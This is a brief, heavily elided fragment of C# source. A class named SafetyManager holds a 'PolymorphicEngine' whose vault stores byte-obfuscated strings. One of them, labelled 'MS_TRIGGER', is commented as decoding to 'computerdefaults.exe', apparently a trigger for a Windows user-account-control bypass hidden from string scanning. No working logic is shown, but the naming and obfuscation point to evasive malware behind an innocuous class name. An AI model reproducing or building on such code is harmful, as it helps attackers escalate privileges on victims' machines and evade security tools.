    ...
    public static class SafetyManager
    {
        ...
        private class PolymorphicEngine
        {
            ...
            private static readonly Dictionary<string, byte[]> _vault = new Dictionary<string, byte[]>
            {
                ...
                { "MS_TRIGGER", new byte[] { 0x35, 0x21, 0x2a, 0x32, 0x30, 0x31, 0x22, 0x37, 0x21, 0x24, 0x21, 0x34, 0x2b, 0x36, 0x33, 0x3e, 0x2b, 0x3b, 0x30, 0x62, 0x20, 0x3d, 0x22 } } // computerdefaults.exe
